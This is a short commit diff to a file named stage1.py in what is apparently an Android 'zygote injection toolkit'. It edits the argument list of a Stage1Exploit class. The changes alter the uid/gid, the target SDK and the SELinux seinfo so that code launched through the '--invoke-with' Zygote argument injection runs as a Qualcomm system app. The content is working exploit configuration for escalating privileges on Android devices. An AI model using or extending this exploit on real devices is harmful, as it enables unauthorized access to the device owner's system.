029f345960b9132e661def9cd378d61d4c9f73f6
コアラ <189215038+coara-chocomaru@users.noreply.github.com>
2026-08-31 19:40:02 +0900

    Update stage1.py

--- zygote_injection_toolkit/stage1.py
+++ zygote_injection_toolkit/stage1.py
@@ -187,12 +187,13 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=10079",
-            "--setgid=10079",
+            "--setuid=10078",
+            "--setgid=10078",
             "--setgroups=3003",
             "--runtime-args",
+            "--target-sdk-version=28",
             "--app-data-dir=/data/user/0/com.qualcomm.qti.qms.service.connectionsecurity",
-            "--seinfo=ssgapp:ssg_app:targetSdkVersion=28:complete",
+            "--seinfo=ssgapp:ssg_app:complete",
             "--runtime-flags=1",
             "--nice-name=ssgapp",
             "--invoke-with",
